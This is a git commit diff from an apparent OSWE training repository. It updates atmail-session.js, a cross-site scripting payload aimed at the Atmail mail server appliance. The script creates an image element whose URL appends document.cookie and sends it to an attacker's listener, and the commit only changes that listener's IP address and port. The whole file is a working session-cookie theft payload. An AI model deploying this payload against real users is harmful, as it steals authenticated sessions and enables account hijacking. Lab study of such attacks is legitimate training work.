08fee4632c2eb5db18020e87cc4db7d6788e1218
NULL <68764921+debiantano@users.noreply.github.com>
2022-03-10 00:08:33 -0500

    Update atmail-session.js

--- OSWE/2_Atmail_Mail_Server_Appliance:_from_XSS_to_RCE/atmail-session.js
+++ OSWE/2_Atmail_Mail_Server_Appliance:_from_XSS_to_RCE/atmail-session.js
@@ -1,6 +1,6 @@
 function addTheImage() { 
  var img = document.createElement('img'); 
- img.src = 'http://192.168.119.120:9090/' + document.cookie; 
+ img.src = 'http://192.168.100.12:8000/' + document.cookie; 
 document.body.appendChild(img); 
 } 
 addTheImage(); 
